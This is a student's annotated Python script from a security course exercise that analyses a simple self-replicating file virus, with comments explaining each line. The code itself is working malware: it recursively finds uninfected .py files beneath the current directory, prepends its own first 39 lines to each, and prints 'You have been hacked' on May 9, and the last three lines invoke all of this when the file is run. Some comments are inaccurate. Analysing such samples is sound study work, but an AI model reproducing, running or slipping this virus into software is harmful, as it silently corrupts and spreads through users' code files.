#!/usr/bin/python
#
# Script Name:  ops-challenge-14
# Author:  Ben_Podawiltz
# Date of last revision:  6.1.21

#################################

# Purpose:Perform and analysis of the python-based code
# [+] 1. Insert comments into each line of the script explaining in your own words what the virus is doing on this line.
# [+] 2. Insert comments above each function explaining what the purpose of this function is and what it hopes to carry out.
# [+] 3. Insert comments above the final three lines explaining how the functions are called and what this script appears to do.
# [] 4. Identify all the core Python/coding tools used by this script, e.g. functions.
# [] 5. What kind of malware is this? Define this type of malware in your own words.
# [] 6. How well is this code written? Would you have done something differently to achieve the same objective?

import os  # imports os module allowing user to interface with the os that python is running on
import datetime  # imports datetime module to work with dates as date objects


SIGNATURE = "VIRUS"  # a variable which is set to equal the string "VIRUS"

# A function to create a target list


def locate(path):
    files_targeted = []  # a vairable set to equal an empty list
    # here a variable is set equal to an os module that returns the list of the entries in the directory given by the path
    filelist = os.listdir(path)
    # for loop used for iterating over a sequence, in this case for fname (or function name) in predefined variable filelist
    for fname in filelist:
        # if statement which states return true if path is an existing directory and adds the filename variable to the path if true
        if os.path.isdir(path+"/"+fname):
            # then add path and filename to the to the files_targeted list
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":  # if the previous does not return true do this; filename variable passing a parameter equal to the string ".py"; the virus is trying to locate filenames with the extention .py
            infected = False  # then sets a variable infected to False with in the script
            # another for loop (iterative) using 'line' as a variable to see if signature variable exists
            for line in open(path+"/"+fname):
                if SIGNATURE in line:  # once inside the new file path
                    infected = True  # change the infected variable to 'True'
                    break  # stop for loop
            if infected == False:  # if infected is not True and equal to False
                # then append then add the python file to files_targeted list
                files_targeted.append(path+"/"+fname)
    return files_targeted  # closes out the function of the files targeted


def infect(files_targeted):  # function that passes the files_targeted list into parameter
    # virus variable set equal to open method that opens a file with the parameter - os module path - object return a normalized absolutized version of the pathname path - with the parameter _file_ being passed to it
    virus = open(os.path.abspath(__file__))
    virusstring = ""  # virsusstring being set equal to an empty string ""
    for i, line in enumerate(virus):  # another for loop to iterate
        if 0 <= i < 39:
            # variable virusstring is = virusstring + line
            virusstring += line
            # closes file
    virus.close
    for fname in files_targeted:  # another for loop in the files_targeted list
        f = open(fname)  # variable set to open filename parameter
        temp = f.read()  # variable set to read the file
        f.close()  # variable set to close the file
        f = open(fname, "w")  # variable set to open and write to the file
        # method to write virusstring and temp variable to target file
        f.write(virusstring + temp)
        # close file
        f.close()


def detonate():  # function to detonate, run
    # if statement setting date equal to 5th montn (may) and 9th day
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"  # prints 'you have been hackes'


# sets files_targeted variable to method locate of absolute path of the operating system
files_targeted = locate(os.path.abspath(""))
# method (?) infects uses files_targeted passed as a parameter to start the infection
infect(files_targeted)
# executes dentonate function
detonate()
